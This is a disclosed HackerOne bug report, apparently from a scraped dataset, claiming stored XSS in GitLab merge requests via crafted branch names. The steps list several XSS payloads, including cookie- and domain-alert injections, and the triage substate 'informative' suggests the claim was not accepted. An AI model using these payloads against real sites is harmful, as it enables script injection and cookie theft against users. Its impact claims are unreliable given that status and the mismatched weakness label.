---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1261148'
original_report_id: '1261148'
title: Stored-XSS in merge requests
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: gitlab
created_at: '2021-07-14T08:06:42.169Z'
disclosed_at: '2021-07-19T19:03:53.004Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 6
asset_identifier: gitlab.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Stored-XSS in merge requests

## Metadata

- HackerOne Report ID: 1261148
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: gitlab
- Disclosed At: 2021-07-19T19:03:53.004Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

Summary
As an attacker I could do XSS on Web.com because it is vulnerable Stored XSS, also known as persistent XSS, is more damaging than non-persistent XSS. It occurs when a malicious script is injected directly into a vulnerable web application.


### Steps to reproduce
1. Go to https://gitlab.com/
2. Create a new branch with name  any of these

<form><button formaction=javascript&colon;alert(1)>CLICKME

"><img src=x onerror=alert(document.domain)>

<iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=></iframe>

<iframe srcdoc="<img src=x onerror=alert(document.domain)>"></iframe>

3. Create a new merge request from the new branch to master
4. XSS is saved and if you will open the readme file and add these payloads to it it will also save these payloads




### Output of checks

This bug happens on GitLab.com

## Impact

This stored-XSS allows attacker to execute arbitrary actions on behalf of victim notably via gitlab API. The attacker can steal data from whoever checks the report.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
